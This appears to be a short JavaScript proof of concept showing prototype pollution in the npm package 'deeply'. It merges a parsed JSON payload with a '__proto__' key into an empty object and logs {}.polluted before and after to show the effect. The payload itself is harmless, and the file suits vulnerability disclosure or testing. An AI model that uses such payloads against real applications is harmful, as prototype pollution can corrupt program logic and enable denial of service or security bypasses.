var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mergeFn = require('deeply');
const payload = '{"__proto__": {"polluted": "yes"}}';
var obj = {};
console.log({}.polluted);
mergeFn(obj, JSON.parse(payload));
console.log({}.polluted);